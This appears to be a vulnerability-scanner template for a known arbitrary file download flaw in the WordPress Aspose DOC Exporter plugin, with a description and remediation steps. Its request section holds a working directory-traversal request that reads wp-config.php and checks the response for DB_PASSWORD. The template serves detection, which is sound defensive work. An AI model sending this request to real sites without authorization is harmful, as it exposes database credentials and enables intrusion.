id: CNVD-2015-04306
info:
  name: Wordpress_aspose-doc-exporter_Plugin_Arbitrary_File_Download_Vulnerability
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Aspose DOC Exporter arbitrary file download vulnerability
    WordPress is a blog platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. Aspose DOC Exporter is a plugin that allows administrators to export article content.

    There is an arbitrary file download vulnerability in the WordPress Aspose DOC Exporter plug-in, which allows remote attackers to use the vulnerability to submit special requests and view the contents of system files with WEB permissions.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/aspose-doc-exporter/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"DB_PASSWORD")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php'
  method: GET
